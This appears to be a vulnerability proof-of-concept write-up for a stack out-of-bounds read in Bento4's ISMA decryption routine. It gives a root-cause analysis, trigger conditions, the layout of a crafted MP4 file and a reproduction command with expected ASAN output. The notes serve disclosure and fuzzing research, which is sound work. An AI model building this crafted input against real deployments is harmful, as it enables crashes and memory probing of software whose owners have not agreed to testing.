# VULN 001 PoC Notes

## Vulnerability Summary

- **Title**: Stack OOB Read in DecryptSampleData via Crafted iSFM iv_length
- **File**: `Bento4/Source/C++/Core/Ap4IsmaCryp.cpp`
- **Function**: `AP4_IsmaCipher::DecryptSampleData()`
- **CWE**: CWE-125 (Out-of-bounds Read)

## Root Cause Analysis

In `DecryptSampleData`, a 16-byte stack buffer `zero_enc[16]` is read out-of-bounds in the
non-block-aligned code path:

```cpp
AP4_UI08 zero_enc[16];
m_Cipher->ProcessBuffer(zero, 16, zero_enc);
unsigned int offset = (unsigned int)(bso%16);   // can be 0-15
unsigned int chunk = offset;                     // initially equals offset
if (chunk > payload_size) chunk = payload_size;
for (unsigned int i=0; i<chunk; i++) {
    out[i] = zero_enc[offset+i]^in[i];          // index = offset+i
}
```

The maximum index into `zero_enc` is `offset + (chunk-1) = offset + (offset-1) = 2*offset - 1`.
When `offset >= 9`, the maximum index is `2*9 - 1 = 17`, which exceeds the array bound of 15.

## Trigger Conditions

1. `iv_length = 1` in the `iSFM` atom (any value 1-8 works)
2. Sample IV byte = `0x09` → `bso = 9`, `bso % 16 = 9 >= 9` → triggers OOB
3. Payload size >= 9 (so `chunk = offset = 9`, not truncated)
4. User must provide `--key` argument (any 16-byte key)
5. `selective_encryption = 0` and `key_indicator_length = 0` (simplifies the path)

## MP4 Structure

The crafted file contains a minimal ISMA-encrypted audio track:

```
ftyp (isom)
moov
  mvhd  (timescale=44100)
  trak
    tkhd  (track_id=1, audio)
    mdia
      mdhd  (timescale=44100)
      hdlr  (handler_type='soun' -> audio track)
      minf
        smhd
        dinf/dref/url
        stbl
          stsd
            enca (encrypted audio sample entry)
              [SampleEntry fields: reserved + data_ref_index]
              [AudioSampleEntry: ch=2, bits=16, rate=44100]
              sinf
                frma  (original_format='mp4a')
                schm  (scheme_type='iAEC', version=1)
                schi
                  iSFM  (selective_enc=0, key_ind_len=0, iv_len=1)  <-- KEY
          stts  (1 sample, delta=1024)
          stsc  (1 chunk, 1 sample/chunk)
          stsz  (sample_size=20)
          stco  (chunk_offset -> mdat data)
mdat
  [0x09][0xAA * 19]   <-- IV=0x09 causes bso=9, 19 bytes payload
```

## Decryption Code Path

With `iv_length=1`, `key_indicator_length=0`, `selective_encryption=false`:

1. `is_encrypted = true` (selective_enc is false)
2. `header_size = 1` (just the IV byte)
3. `payload_size = 20 - 1 = 19`
4. `iv_start` points to byte `0x09`
5. `bso_bytes[7] = 0x09` → `bso = 9`
6. `bso % 16 = 9` → enters non-block-aligned branch
7. `offset = 9`, `chunk = min(9, 19) = 9`
8. Loop `i=0..8`: `out[i] = zero_enc[9+i] ^ in[i]`
   - At `i=8`: `zero_enc[17]` → **out-of-bounds read** (array is `[0..15]`)

## Expected ASAN Output

```
==XXXXX==ERROR: AddressSanitizer: stack-buffer-overflow on address ...
READ of size 1 at ... thread T0
    #0 ... in AP4_IsmaCipher::DecryptSampleData(...)  Ap4IsmaCryp.cpp:...
```

## Command to Reproduce

```bash
/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac \
    --key 0123456789abcdef0123456789abcdef \
    vuln_001.mp4 /dev/null
```
